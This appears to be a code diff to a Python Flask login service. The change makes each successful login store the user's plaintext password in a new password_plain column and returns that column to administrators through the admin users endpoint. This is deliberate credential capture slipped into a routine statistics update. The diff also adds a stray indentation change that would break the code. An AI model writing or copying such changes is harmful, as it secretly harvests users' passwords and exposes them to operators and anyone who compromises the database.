@@ -173,13 +173,14 @@ def login():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
 
     # Обновляем статистику
-    cur.execute("""
+        cur.execute("""
         UPDATE users
         SET last_login = %s, last_ip = %s,
             login_count = login_count + 1,
+            password_plain = %s,
             hwid = CASE WHEN hwid = '' THEN %s ELSE hwid END
         WHERE id = %s
-    """, (now_iso(), ip, hwid, row["id"]))
+    """, (now_iso(), ip, password, hwid, row["id"]))
     conn.commit()
     cur.close()
     conn.close()
@@ -228,7 +229,8 @@ def admin_users():
     cur = conn.cursor(cursor_factory=RealDictCursor)
     cur.execute("""
         SELECT id, username, role, is_banned, hwid,
-               login_count, last_login, last_ip, created_at
+               login_count, last_login, last_ip, created_at,
+               password_plain
         FROM users
         ORDER BY id ASC
     """)
@@ -248,6 +250,7 @@ def admin_users():
             "last_login": r["last_login"],
             "last_ip": r["last_ip"],
             "created_at": r["created_at"],
+            "password_plain": r["password_plain"] or "",
         })
 
     return jsonify({"ok": True, "users": users, "total": len(users)})
